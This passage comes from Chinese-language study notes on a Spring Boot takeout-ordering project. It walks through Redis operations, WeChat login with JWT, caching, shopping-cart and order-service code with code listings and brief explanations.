hashOperations.put(\u0026#34;100\u0026#34;,\u0026#34;name\u0026#34;,\u0026#34;tom\u0026#34;); hashOperations.put(\u0026#34;100\u0026#34;,\u0026#34;age\u0026#34;,\u0026#34;20\u0026#34;); String name = (String) hashOperations.get(\u0026#34;100\u0026#34;, \u0026#34;name\u0026#34;); System.out.println(name); Set keys = hashOperations.keys(\u0026#34;100\u0026#34;); System.out.println(keys); List values = hashOperations.values(\u0026#34;100\u0026#34;); System.out.println(values); hashOperations.delete(\u0026#34;100\u0026#34;,\u0026#34;age\u0026#34;); } 列表类型 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 /** * 操作列表类型的数据 */ public void testList(){ //lpush lrange rpop llen ListOperations listOperations = redisTemplate.opsForList(); listOperations.leftPushAll(\u0026#34;mylist\u0026#34;,\u0026#34;a\u0026#34;,\u0026#34;b\u0026#34;,\u0026#34;c\u0026#34;); listOperations.leftPush(\u0026#34;mylist\u0026#34;,\u0026#34;d\u0026#34;); List mylist = listOperations.range(\u0026#34;mylist\u0026#34;, 0, -1); System.out.println(mylist); listOperations.rightPop(\u0026#34;mylist\u0026#34;); Long size = listOperations.size(\u0026#34;mylist\u0026#34;); System.out.println(size); } 集合类型 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 /** * 操作集合类型的数据 */ @Test public void testSet(){ //sadd smembers scard sinter sunion srem SetOperations setOperations = redisTemplate.opsForSet(); setOperations.add(\u0026#34;set1\u0026#34;,\u0026#34;a\u0026#34;,\u0026#34;b\u0026#34;,\u0026#34;c\u0026#34;,\u0026#34;d\u0026#34;); setOperations.add(\u0026#34;set2\u0026#34;,\u0026#34;a\u0026#34;,\u0026#34;b\u0026#34;,\u0026#34;x\u0026#34;,\u0026#34;y\u0026#34;); Set members = setOperations.members(\u0026#34;set1\u0026#34;); System.out.println(members); Long size = setOperations.size(\u0026#34;set1\u0026#34;); System.out.println(size); Set intersect = setOperations.intersect(\u0026#34;set1\u0026#34;, \u0026#34;set2\u0026#34;); System.out.println(intersect); Set union = setOperations.union(\u0026#34;set1\u0026#34;, \u0026#34;set2\u0026#34;); System.out.println(union); setOperations.remove(\u0026#34;set1\u0026#34;,\u0026#34;a\u0026#34;,\u0026#34;b\u0026#34;); } 有序集合类型 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 /** * 操作有序集合类型的数据 */ @Test public void testZset(){ //zadd zrange zincrby zrem ZSetOperations zSetOperations = redisTemplate.opsForZSet(); zSetOperations.add(\u0026#34;zset1\u0026#34;,\u0026#34;a\u0026#34;,10); zSetOperations.add(\u0026#34;zset1\u0026#34;,\u0026#34;b\u0026#34;,12); zSetOperations.add(\u0026#34;zset1\u0026#34;,\u0026#34;c\u0026#34;,9); Set zset1 = zSetOperations.range(\u0026#34;zset1\u0026#34;, 0, -1); System.out.println(zset1); zSetOperations.incrementScore(\u0026#34;zset1\u0026#34;,\u0026#34;c\u0026#34;,10); zSetOperations.remove(\u0026#34;zset1\u0026#34;,\u0026#34;a\u0026#34;,\u0026#34;b\u0026#34;); } 通用命令 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 /** * 通用命令操作 */ @Test public void testCommon(){ //keys exists type del Set keys = redisTemplate.keys(\u0026#34;*\u0026#34;); System.out.println(keys); Boolean name = redisTemplate.hasKey(\u0026#34;name\u0026#34;); Boolean set1 = redisTemplate.hasKey(\u0026#34;set1\u0026#34;); for (Object key : keys) { DataType type = redisTemplate.type(key); System.out.println(type.name()); } redisTemplate.delete(\u0026#34;mylist\u0026#34;); } 店铺营业状态设置 接口设计：\n设置营业状态 管理端查询营业状态 用户端查询营业状态 admin - ShopController user 类似，重名的 class 要指定 RestController 名称，否则自动装配会分辨不了 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 package com.sky.controller.admin; @RestController(\u0026#34;adminShopController\u0026#34;) @RequestMapping(\u0026#34;/admin/shop\u0026#34;) @Api(tags = \u0026#34;店铺相关接口\u0026#34;) @Slf4j public class ShopController { public static final String KEY = \u0026#34;SHOP_STATUS\u0026#34;; @Autowired private RedisTemplate redisTemplate; /** * 设置店铺的营业状态 * @param status * @return */ @PutMapping(\u0026#34;/{status}\u0026#34;) @ApiOperation(\u0026#34;设置店铺的营业状态\u0026#34;) public Result setStatus(@PathVariable Integer status){ log.info(\u0026#34;设置店铺的营业状态为：{}\u0026#34;,status == 1 ? \u0026#34;营业中\u0026#34; : \u0026#34;打烊中\u0026#34;); redisTemplate.opsForValue().set(KEY,status); return Result.success(); } /** * 获取店铺的营业状态 * @return */ @GetMapping(\u0026#34;/status\u0026#34;) @ApiOperation(\u0026#34;获取店铺的营业状态\u0026#34;) public Result\u0026lt;Integer\u0026gt; getStatus(){ Integer status = (Integer) redisTemplate.opsForValue().get(KEY); log.info(\u0026#34;获取到店铺的营业状态为：{}\u0026#34;,status == 1 ? \u0026#34;营业中\u0026#34; : \u0026#34;打烊中\u0026#34;); return Result.success(status); } } 用户、管理接口分离 WebConfiguration 中配置扫描\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 @Bean public Docket docket1(){ log.info(\u0026#34;准备生成接口文档...\u0026#34;); ApiInfo apiInfo = new ApiInfoBuilder() .title(\u0026#34;苍穹外卖项目接口文档\u0026#34;) .version(\u0026#34;2.0\u0026#34;) .description(\u0026#34;苍穹外卖项目接口文档\u0026#34;) .build(); Docket docket = new Docket(DocumentationType.SWAGGER_2) .groupName(\u0026#34;管理端接口\u0026#34;) .apiInfo(apiInfo) .select() //指定生成接口需要扫描的包 .apis(RequestHandlerSelectors.basePackage(\u0026#34;com.sky.controller.admin\u0026#34;)) .paths(PathSelectors.any()) .build(); return docket; } @Bean public Docket docket2(){ log.info(\u0026#34;准备生成接口文档...\u0026#34;); ApiInfo apiInfo = new ApiInfoBuilder() .title(\u0026#34;苍穹外卖项目接口文档\u0026#34;) .version(\u0026#34;2.0\u0026#34;) .description(\u0026#34;苍穹外卖项目接口文档\u0026#34;) .build(); Docket docket = new Docket(DocumentationType.SWAGGER_2) .groupName(\u0026#34;用户端接口\u0026#34;) .apiInfo(apiInfo) .select() //指定生成接口需要扫描的包 .apis(RequestHandlerSelectors.basePackage(\u0026#34;com.sky.controller.user\u0026#34;)) .paths(PathSelectors.any()) .build(); return docket; } HttpClient HttpClient作用：\n发送HTTP请求 接收响应数据 使用扫描支付、查看地图、获取验证码、查看天气等功能 导入坐标 1 2 3 4 5 \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.apache.httpcomponents\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;httpclient\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;4.5.13\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; 核心 API\nHttpClient：Http客户端对象类型，使用该类型对象可发起Http请求。\nHttpClients：可认为是构建器，可创建HttpClient对象。\nCloseableHttpClient：实现类，实现了HttpClient接口。\nHttpGet：Get方式请求类型。\nHttpPost：Post方式请求类型。\n发送请求步骤：\n创建HttpClient对象 创建Http请求对象 调用HttpClient的execute方法发送请求 案例 get 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 @SpringBootTest public class HttpClientTest { /** * 测试通过httpclient发送GET方式的请求 */ @Test public void testGET() throws Exception{ //创建httpclient对象 CloseableHttpClient httpClient = HttpClients.createDefault(); //创建请求对象 HttpGet httpGet = new HttpGet(\u0026#34;http://localhost:8080/user/shop/status\u0026#34;); //发送请求，接受响应结果 CloseableHttpResponse response = httpClient.execute(httpGet); //获取服务端返回的状态码 int statusCode = response.getStatusLine().getStatusCode(); System.out.println(\u0026#34;服务端返回的状态码为：\u0026#34; + statusCode); HttpEntity entity = response.getEntity(); String body = EntityUtils.toString(entity); System.out.println(\u0026#34;服务端返回的数据为：\u0026#34; + body); //关闭资源 response.close(); httpClient.close(); } } post 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 /** * 测试通过httpclient发送POST方式的请求 */ @Test public void testPOST() throws Exception{ // 创建httpclient对象 CloseableHttpClient httpClient = HttpClients.createDefault(); //创建请求对象 HttpPost httpPost = new HttpPost(\u0026#34;http://localhost:8080/admin/employee/login\u0026#34;); JSONObject jsonObject = new JSONObject(); jsonObject.put(\u0026#34;username\u0026#34;,\u0026#34;admin\u0026#34;); jsonObject.put(\u0026#34;password\u0026#34;,\u0026#34;123456\u0026#34;); StringEntity entity = new StringEntity(jsonObject.toString()); //指定请求编码方式 entity.setContentEncoding(\u0026#34;utf-8\u0026#34;); //数据格式 entity.setContentType(\u0026#34;application/json\u0026#34;); httpPost.setEntity(entity); //发送请求 CloseableHttpResponse response = httpClient.execute(httpPost); //解析返回结果 int statusCode = response.getStatusLine().getStatusCode(); System.out.println(\u0026#34;响应码为：\u0026#34; + statusCode); HttpEntity entity1 = response.getEntity(); String body = EntityUtils.toString(entity1); System.out.println(\u0026#34;响应数据为：\u0026#34; + body); //关闭资源 response.close(); httpClient.close(); } 微信小程序开发 小程序目录结构 小程序包含一个描述整体程序的 app 和多个描述各自页面的 page。一个小程序主体部分由三个文件组成，必须放在项目的根目录，如下： **app.js：**必须存在，主要存放小程序的逻辑代码 **app.json：**必须存在，小程序配置文件，主要存放小程序的公共配置 app.wxss: 非必须存在，主要存放小程序公共样式表，类似于前端的CSS样式 每个小程序页面主要由四个文件组成：\n**js文件：**必须存在，存放页面业务逻辑代码，编写的js代码。\n**wxml文件：**必须存在，存放页面结构，主要是做页面布局，页面效果展示的，类似于HTML页面。\n**json文件：**非必须，存放页面相关的配置。\n**wxss文件：**非必须，存放页面样式表，相当于CSS文件。\n实现微信登录 步骤分析：\n小程序端，调用wx.login()获取code，就是授权码。\n小程序端，调用wx.request()发送请求并携带code，请求开发者服务器(自己编写的后端服务)。\n开发者服务端，通过HttpClient向微信接口服务发送请求，并携带appId+appsecret+code三个参数。\n开发者服务端，接收微信接口服务返回的数据，session_key+opendId等。opendId是微信用户的唯一标识。\n开发者服务端，自定义登录态，生成令牌(token)和openid等数据返回给小程序端，方便后绪请求身份校验。\n小程序端，收到自定义登录态，存储storage。\n小程序端，后绪通过wx.request()发起业务请求时，携带token。\n开发者服务端，收到请求后，通过携带的token，解析当前登录用户的id。\n开发者服务端，身份校验通过后，继续相关的业务逻辑处理，最终返回业务数据。\n基于文档描述的所需参数，即可设计出登录接口\n请求参数：前端像后端传递 code\n返回数据：后端请求接口，再返回 id、openid、token\n设计用户表\nController\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 public class UserController { @Autowired private UserService userService; @Autowired private JwtProperties jwtProperties; /** * 微信登录 * @param userLoginDTO * @return */ @PostMapping(\u0026#34;/login\u0026#34;) @ApiOperation(\u0026#34;微信登录\u0026#34;) public Result\u0026lt;UserLoginVO\u0026gt; login(@RequestBody UserLoginDTO userLoginDTO){ log.info(\u0026#34;微信用户登录：{}\u0026#34;,userLoginDTO.getCode()); //微信登录 User user = userService.wxLogin(userLoginDTO); //为微信用户生成jwt令牌 Map\u0026lt;String, Object\u0026gt; claims = new HashMap\u0026lt;\u0026gt;(); claims.put(JwtClaimsConstant.USER_ID,user.getId()); String token = JwtUtil.createJWT(jwtProperties.getUserSecretKey(), jwtProperties.getUserTtl(), claims); UserLoginVO userLoginVO = UserLoginVO.builder() .id(user.getId()) .openid(user.getOpenid()) .token(token) .build(); return Result.success(userLoginVO); } } Service 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 package com.sky.service.impl; @Service @Slf4j public class UserServiceImpl implements UserService { //微信服务接口地址 public static final String WX_LOGIN = \u0026#34;https://api.weixin.qq.com/sns/jscode2session\u0026#34;; @Autowired private WeChatProperties weChatProperties; @Autowired private UserMapper userMapper; /** * 微信登录 * @param userLoginDTO * @return */ public User wxLogin(UserLoginDTO userLoginDTO) { String openid = getOpenid(userLoginDTO.getCode()); //判断openid是否为空，如果为空表示登录失败，抛出业务异常 if(openid == null){ throw new LoginFailedException(MessageConstant.LOGIN_FAILED); } //判断当前用户是否为新用户 User user = userMapper.getByOpenid(openid); //如果是新用户，自动完成注册 if(user == null){ user = User.builder() .openid(openid) .createTime(LocalDateTime.now()) .build(); userMapper.insert(user);//后绪步骤实现 } //返回这个用户对象 return user; } /** * 调用微信接口服务，获取微信用户的openid * @param code * @return */ private String getOpenid(String code){ //调用微信接口服务，获得当前微信用户的openid Map\u0026lt;String, String\u0026gt; map = new HashMap\u0026lt;\u0026gt;(); map.put(\u0026#34;appid\u0026#34;,weChatProperties.getAppid()); map.put(\u0026#34;secret\u0026#34;,weChatProperties.getSecret()); map.put(\u0026#34;js_code\u0026#34;,code); map.put(\u0026#34;grant_type\u0026#34;,\u0026#34;authorization_code\u0026#34;); String json = HttpClientUtil.doGet(WX_LOGIN, map); JSONObject jsonObject = JSON.parseObject(json); String openid = jsonObject.getString(\u0026#34;openid\u0026#34;); return openid; } } 配置令牌校验 学一下怎么校验 Claims claims = JwtUtil.parseJWT(jwtProperties.getUserSecretKey(), token); 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 @Component @Slf4j public class JwtTokenUserInterceptor implements HandlerInterceptor { @Autowired private JwtProperties jwtProperties; /** * 校验jwt * * @param request * @param response * @param handler * @return * @throws Exception */ public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception { //判断当前拦截到的是Controller的方法还是其他资源 if (!(handler instanceof HandlerMethod)) { //当前拦截到的不是动态方法，直接放行 return true; } //1、从请求头中获取令牌 String token = request.getHeader(jwtProperties.getUserTokenName()); //2、校验令牌 try { log.info(\u0026#34;jwt校验:{}\u0026#34;, token); Claims claims = JwtUtil.parseJWT(jwtProperties.getUserSecretKey(), token); Long userId = Long.valueOf(claims.get(JwtClaimsConstant.USER_ID).toString()); log.info(\u0026#34;当前用户的id：\u0026#34;, userId); BaseContext.setCurrentId(userId); //3、通过，放行 return true; } catch (Exception ex) { //4、不通过，响应401状态码 response.setStatus(401); return false; } } } 缓存 菜品 - 原始方法 用户端小程序展示的菜品数据都是通过查询数据库获得，如果用户端访问量比较大，数据库访问压力随之增大。\n用 Redis 缓存菜品数据，减少数据库操作 缓存逻辑分析：\n每个分类下的菜品保存一份缓存数据 数据库中菜品数据有变更时清理缓存数据 Controller\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 // 修改 DishController 调用 Mapper 的逻辑 public Result\u0026lt;List\u0026lt;DishVO\u0026gt;\u0026gt; list(Long categoryId) { //构造redis中的key，规则：dish_分类id String key = \u0026#34;dish_\u0026#34; + categoryId; //查询redis中是否存在菜品数据 List\u0026lt;DishVO\u0026gt; list = (List\u0026lt;DishVO\u0026gt;) redisTemplate.opsForValue().get(key); if(list != null \u0026amp;\u0026amp; list.size() \u0026gt; 0){ //如果存在，直接返回，无须查询数据库 return Result.success(list); } //////////////////////////////////////////////////////// Dish dish = new Dish(); dish.setCategoryId(categoryId); dish.setStatus(StatusConstant.ENABLE);//查询起售中的菜品 //如果不存在，查询数据库，将查询到的数据放入redis中 list = dishService.listWithFlavor(dish); //////////////////////////////////////////////////////// redisTemplate.opsForValue().set(key, list); return Result.success(list); } 为了保证数据库和Redis中的数据保持一致，修改管理端接口 DishController 的相关方法，加入清理缓存逻辑。\nController 再新增、删除、更新等逻辑后面添加 支持通配符删除 1 2 3 4 5 // 管理端 DishController 中的清理缓存逻辑 private void cleanCache(String pattern){ Set keys = redisTemplate.keys(pattern); redisTemplate.delete(keys); } 套餐 - SpringCache Spring Cache 是一个框架，实现了基于注解的缓存功能，只需要简单地加一个注解，就能实现缓存功能。\nSpring Cache 提供了一层抽象，底层可以切换不同的缓存实现，例如：\nEHCache Caffeine Redis(常用) 1 2 3 4 \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.springframework.boot\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;spring-boot-starter-cache\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;2.7.3\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; 常用注解 注解 说明 @EnableCaching 开启缓存注解功能，通常加在启动类上 @Cacheable 在方法执行前先查询缓存中是否有数据，如果有数据，则直接返回缓存数据；如果没有缓存数据，调用方法并将方法返回值放到缓存中 @CachePut 将方法的返回值放到缓存中 @CacheEvict 将一条或多条数据从缓存中删除 @CachePut(value = \u0026ldquo;userCache\u0026rdquo;, key = \u0026ldquo;#user.id\u0026rdquo;)\n@Cacheable(cacheNames = \u0026ldquo;userCache\u0026rdquo;,key=\u0026quot;#id\u0026quot;)\n@CacheEvict(cacheNames = \u0026ldquo;userCache\u0026rdquo;,key = \u0026ldquo;#id\u0026rdquo;)\n启动类中添加 @EnableCaching 用户端 SetmealController 的 list 方法上加入@Cacheable注解 @Cacheable(cacheNames = \u0026quot;setmealCache\u0026quot;,key = \u0026quot;#categoryId\u0026quot;)\n管理端接口SetmealController的 save、delete、update、startOrStop等方法上加入 CacheEvict 注解 @CacheEvict(cacheNames = \u0026quot;setmealCache\u0026quot;,allEntries = true)\n购物车 新增 关注点\n只能查询自己购物车的数据：shoppingCart.setUserId(BaseContext.getCurrentId()); 添加菜品 or 套餐的判断 Controller\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 package com.sky.service.impl; @Service public class ShoppingCartServiceImpl implements ShoppingCartService { @Autowired private ShoppingCartMapper shoppingCartMapper; @Autowired private DishMapper dishMapper; @Autowired private SetmealMapper setmealMapper; /** * 添加购物车 * * @param shoppingCartDTO */ public void addShoppingCart(ShoppingCartDTO shoppingCartDTO) { ShoppingCart shoppingCart = new ShoppingCart(); BeanUtils.copyProperties(shoppingCartDTO, shoppingCart); //只能查询自己的购物车数据 shoppingCart.setUserId(BaseContext.getCurrentId()); //判断当前商品是否在购物车中 List\u0026lt;ShoppingCart\u0026gt; shoppingCartList = shoppingCartMapper.list(shoppingCart); if (shoppingCartList != null \u0026amp;\u0026amp; shoppingCartList.size() == 1) { //如果已经存在，就更新数量，数量加1 shoppingCart = shoppingCartList.get(0); shoppingCart.setNumber(shoppingCart.getNumber() + 1); shoppingCartMapper.updateNumberById(shoppingCart); } else { //如果不存在，插入数据，数量就是1 //判断当前添加到购物车的是菜品还是套餐 Long dishId = shoppingCartDTO.getDishId(); if (dishId != null) { //添加到购物车的是菜品 Dish dish = dishMapper.getById(dishId); shoppingCart.setName(dish.getName()); shoppingCart.setImage(dish.getImage()); shoppingCart.setAmount(dish.getPrice()); } else { //添加到购物车的是套餐 Setmeal setmeal = setmealMapper.getById(shoppingCartDTO.getSetmealId()); shoppingCart.setName(setmeal.getName()); shoppingCart.setImage(setmeal.getImage()); shoppingCart.setAmount(setmeal.getPrice()); } shoppingCart.setNumber(1); shoppingCart.setCreateTime(LocalDateTime.now()); shoppingCartMapper.insert(shoppingCart); } } } Service 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 @Service public class ShoppingCartServiceImpl implements ShoppingCartService { @Autowired private ShoppingCartMapper shoppingCartMapper; @Autowired private DishMapper dishMapper; @Autowired private SetmealMapper setmealMapper; /** * 添加购物车 * * @param shoppingCartDTO */ public void addShoppingCart(ShoppingCartDTO shoppingCartDTO) { ShoppingCart shoppingCart = new ShoppingCart(); BeanUtils.copyProperties(shoppingCartDTO, shoppingCart); //只能查询自己的购物车数据 shoppingCart.setUserId(BaseContext.getCurrentId()); //判断当前商品是否在购物车中 List\u0026lt;ShoppingCart\u0026gt; shoppingCartList = shoppingCartMapper.list(shoppingCart); if (shoppingCartList != null \u0026amp;\u0026amp; shoppingCartList.size() == 1) { //如果已经存在，就更新数量，数量加1 shoppingCart = shoppingCartList.get(0); shoppingCart.setNumber(shoppingCart.getNumber() + 1); shoppingCartMapper.updateNumberById(shoppingCart); } else { //如果不存在，插入数据，数量就是1 //判断当前添加到购物车的是菜品还是套餐 Long dishId = shoppingCartDTO.getDishId(); if (dishId != null) { //添加到购物车的是菜品 Dish dish = dishMapper.getById(dishId); shoppingCart.setName(dish.getName()); shoppingCart.setImage(dish.getImage()); shoppingCart.setAmount(dish.getPrice()); } else { //添加到购物车的是套餐 Setmeal setmeal = setmealMapper.getById(shoppingCartDTO.getSetmealId()); shoppingCart.setName(setmeal.getName()); shoppingCart.setImage(setmeal.getImage()); shoppingCart.setAmount(setmeal.getPrice()); } shoppingCart.setNumber(1); shoppingCart.setCreateTime(LocalDateTime.now()); shoppingCartMapper.insert(shoppingCart); } } } Mapper 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 package com.sky.mapper; @Mapper public interface ShoppingCartMapper { /** * 条件查询 * * @param shoppingCart * @return */ List\u0026lt;ShoppingCart\u0026gt; list(ShoppingCart shoppingCart); /** * 更新商品数量 * * @param shoppingCart */ @Update(\u0026#34;update shopping_cart set number = #{number} where id = #{id}\u0026#34;) void updateNumberById(ShoppingCart shoppingCart); /** * 插入购物车数据 * * @param shoppingCart */ @Insert(\u0026#34;insert into shopping_cart (name, user_id, dish_id, setmeal_id, dish_flavor, number, amount, image, create_time) \u0026#34; + \u0026#34; values (#{name},#{userId},#{dishId},#{setmealId},#{dishFlavor},#{number},#{amount},#{image},#{createTime})\u0026#34;) void insert(ShoppingCart shoppingCart); } 注意！User 需要用到 id，故需要设置回填！！ useGeneratedKeys\n1 2 3 4 \u0026lt;insert id=\u0026#34;insert\u0026#34; useGeneratedKeys=\u0026#34;true\u0026#34; keyProperty=\u0026#34;id\u0026#34;\u0026gt; insert into user (openid, name, phone, sex, id_number, avatar, create_time) values (#{openid}, #{name}, #{phone}, #{sex}, #{idNumber}, #{avatar}, #{createTime}) \u0026lt;/insert\u0026gt; 注意！定义了 jwt 拦截器以后要在配置类（WebMvcConfuguration）里注册！！\n1 2 3 4 5 6 7 8 9 protected void addInterceptors(InterceptorRegistry registry) { log.info(\u0026#34;开始注册自定义拦截器...\u0026#34;); registry.addInterceptor(jwtTokenAdminInterceptor) .addPathPatterns(\u0026#34;/admin/**\u0026#34;) .excludePathPatterns(\u0026#34;/admin/employee/login\u0026#34;); registry.addInterceptor(jwtTokenUserInterceptor) .addPathPatterns(\u0026#34;/user/**\u0026#34;) .excludePathPatterns(\u0026#34;/user/user/login\u0026#34;); } 查询 类似，调用动态查询即可\n删除 略\n地址簿 接口设计：\n新增地址 查询登录用户所有地址 查询默认地址 根据id修改地址 根据id删除地址 根据id查询地址 设置默认地址 类似的增删改查\n用户下单 根据接口设计 DTO、VO Controller 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 package com.sky.controller.user; /** * 订单 */ @RestController(\u0026#34;userOrderController\u0026#34;) @RequestMapping(\u0026#34;/user/order\u0026#34;) @Slf4j @Api(tags = \u0026#34;C端-订单接口\u0026#34;) public class OrderController { @Autowired private OrderService orderService; @PostMapping(\u0026#34;/submit\u0026#34;) @ApiOperation(\u0026#34;用户下单\u0026#34;) public Result\u0026lt;OrderSubmitVO\u0026gt; submit(@RequestBody OrdersSubmitDTO ordersSubmitDTO) { log.info(\u0026#34;用户下单：{}\u0026#34;, ordersSubmitDTO); OrderSubmitVO orderSubmitVO = orderService.submitOrder(ordersSubmitDTO); return Result.success(orderSubmitVO); } } Service 异常处理 查询购物车数据 构造、添加订单表 构造、加入订单明细表 清空购物车，封装返回结果 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 package com.sky.service.impl; /** * 订单 */ @Service @Slf4j public class OrderServiceImpl implements OrderService { @Autowired private OrderMapper orderMapper; @Autowired private OrderDetailMapper orderDetailMapper; @Autowired private ShoppingCartMapper shoppingCartMapper; @Autowired private AddressBookMapper addressBookMapper; /** * 用户下单 * * @param ordersSubmitDTO * @return */ @Transactional public OrderSubmitVO submitOrder(OrdersSubmitDTO ordersSubmitDTO) { //异常情况的处理（收货地址为空、超出配送范围、购物车为空） AddressBook addressBook = addressBookMapper.getById(ordersSubmitDTO.getAddressBookId()); if (addressBook == null) { throw new AddressBookBusinessException(MessageConstant.ADDRESS_BOOK_IS_NULL); } Long userId = BaseContext.getCurrentId(); ShoppingCart shoppingCart = new ShoppingCart(); shoppingCart.setUserId(userId); //查询当前用户的购物车数据 List\u0026lt;ShoppingCart\u0026gt; shoppingCartList = shoppingCartMapper.list(shoppingCart); if (shoppingCartList == null || shoppingCartList.size() == 0) { throw new ShoppingCartBusinessException(MessageConstant.SHOPPING_CART_IS_NULL); } //构造订单数据 Orders order = new Orders(); BeanUtils.copyProperties(ordersSubmitDTO,order); order.setPhone(addressBook.getPhone()); order.setAddress(addressBook.getDetail()); order.setConsignee(addressBook.getConsignee()); order.setNumber(String.valueOf(System.currentTimeMillis())); order.setUserId(userId); order.setStatus(Orders.PENDING_PAYMENT); order.setPayStatus(Orders.UN_PAID); order.setOrderTime(LocalDateTime.now()); //向订单表插入1条数据 orderMapper.insert(order); //订单明细数据 List\u0026lt;OrderDetail\u0026gt; orderDetailList = new ArrayList\u0026lt;\u0026gt;(); for (ShoppingCart cart : shoppingCartList) { OrderDetail orderDetail = new OrderDetail(); BeanUtils.copyProperties(cart, orderDetail); orderDetail.setOrderId(order.getId()); orderDetailList.add(orderDetail); } //向明细表插入n条数据 orderDetailMapper.insertBatch(orderDetailList); //清理购物车中的数据 shoppingCartMapper.deleteByUserId(userId); //封装返回结果 OrderSubmitVO orderSubmitVO = OrderSubmitVO.builder() .id(order.getId()) .orderNumber(order.getNumber()) .orderAmount(order.getAmount()) .orderTime(order.getOrderTime()) .build(); return orderSubmitVO; } } 订单支付 参考支付文档：https://pay.weixin.qq.com/static/product/product_index.shtml\n流程： 关键是新增了微信后台的接口 订单管理 查询历史订单 写代码之前先想清楚用什么实体类、查什么表什么字段、返回什么！\n订单表、订单明细表不同 \u0026ndash;\u0026gt; 需要先查出订单 id，在去订单明细表中查明细 各个功能的接口要看清楚\n接收参数不一定要用实体类接……\n还要注意实体类之间的继承关系 删除订单 业务逻辑、场景要考虑全面 待支付和待接单状态下，用户可直接取消订单 商家已接单状态下，用户取消订单需电话沟通商家 派送中状态下，用户取消订单需电话沟通商家 如果在待接单状态下取消订单，需要给用户退款 取消订单后需要将订单状态修改为“已取消” 参考 Service 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 /** * 用户取消订单 * * @param id */ public void userCancelById(Long id) throws Exception { // 根据id查询订单 Orders ordersDB = orderMapper.getById(id); // 校验订单是否存在 if (ordersDB == null) { throw new OrderBusinessException(MessageConstant.ORDER_NOT_FOUND); } //订单状态 1待付款 2待接单 3已接单 4派送中 5已完成 6已取消 if (ordersDB.getStatus() \u0026gt; 2) { throw new OrderBusinessException(MessageConstant.ORDER_STATUS_ERROR); } Orders orders = new Orders(); orders.setId(ordersDB.getId()); // 订单处于待接单状态下取消，需要进行退款 if (ordersDB.getStatus().equals(Orders.TO_BE_CONFIRMED)) { //调用微信支付退款接口 weChatPayUtil.refund( ordersDB.getNumber(), //商户订单号 ordersDB.getNumber(), //商户退款单号 new BigDecimal(0.01),//退款金额，单位 元 new BigDecimal(0.01));//原订单金额 //支付状态修改为 退款 orders.setPayStatus(Orders.REFUND); } // 更新订单状态、取消原因、取消时间 orders.setStatus(Orders.CANCELLED); orders.setCancelReason(\u0026#34;用户取消\u0026#34;); orders.setCancelTime(LocalDateTime.now()); orderMapper.update(orders); } 再来一单 再来一单就是将原订单中的商品重新加入到购物车中\nService 注意看对象转换的 stream 流 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 /** * 再来一单 * * @param id */ public void repetition(Long id) { // 查询当前用户id Long userId = BaseContext.getCurrentId(); // 根据订单id查询当前订单详情 List\u0026lt;OrderDetail\u0026gt; orderDetailList = orderDetailMapper.getByOrderId(id); // 将订单详情对象转换为购物车对象 List\u0026lt;ShoppingCart\u0026gt; shoppingCartList = orderDetailList.stream().map(x -\u0026gt; { ShoppingCart shoppingCart = new ShoppingCart(); // 将原订单详情里面的菜品信息重新复制到购物车对象中 BeanUtils.copyProperties(x, shoppingCart, \u0026#34;id\u0026#34;); shoppingCart.setUserId(userId); shoppingCart.setCreateTime(LocalDateTime.now()); return shoppingCart; }).collect(Collectors.toList()); // 将购物车对象批量添加到数据库 shoppingCartMapper.insertBatch(shoppingCartList); } 商家搜索 SQL 中，\u0026gt;= 会和标签混淆，故要用 